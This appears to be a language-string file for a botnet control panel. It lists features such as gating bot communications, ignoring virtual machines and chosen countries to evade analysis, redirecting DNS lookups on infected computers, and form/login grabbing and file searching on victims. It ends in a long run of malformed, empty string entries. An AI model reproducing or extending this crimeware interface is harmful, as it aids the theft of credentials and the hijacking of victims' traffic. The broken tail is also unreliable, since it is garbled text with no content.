"Disable bot communications gateway" => ""
"Disabling the gateway will prevent any bots from communicating with the panel until re-enabled" => ""
"Ignore communications from virtual machines" => ""

"Ignore communications from countries <i>(Provide ISO-2 country codes separated only by a comma. For example: &nbsp;ES, RU, KZ, KR)</i>" => ""
"Clear failed logins count" => ""
"Modify IP Blacklist" => ""
"Bot DNS Modification List" => ""

"Using this feature, you can cause domain name lookups on the client computers to be redirected to your own custom IP address. Also available is targeting via wildcards (*). For example, this entry: <br /><br />*domain* 127.0.0.1<br /><br />Would cause all domain name lookups with the phrase <i>domain</i> in it to be redirected to IP 127.0.0.1" => ""

"Number of DNS entries being modified:" => ""
"Number of free DNS modification entries:" => ""
"Modify DNS List" => ""
"Event logs" => ""
"Enable event logging" => ""

"Enabling logs can put you at risk should the log data be compromised" => ""
"Mask stored IP addresses" => ""
"Log successful logins" => ""
"Log new task creation" => ""
"Log settings changes" => ""
"Log new user creation" => ""
"Log user modification" => ""
"Log task edits" => ""
"Log task deletion" => ""
"Log Formgrab filter modifications" => ""
"Log form/login grabber status changes" => ""
"Log FileSearch config changes" => ""
"Log database maintenance actions" => ""

"Event type" => ""
"Username" => ""
"IP Address" => ""
"Date" => ""
"Extended information" => ""

"Clear event logs" => ""
"You do not have the proper permissions to view log data." => ""

"Save Settings" => ""
"Go back" => ""

" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
" => ""
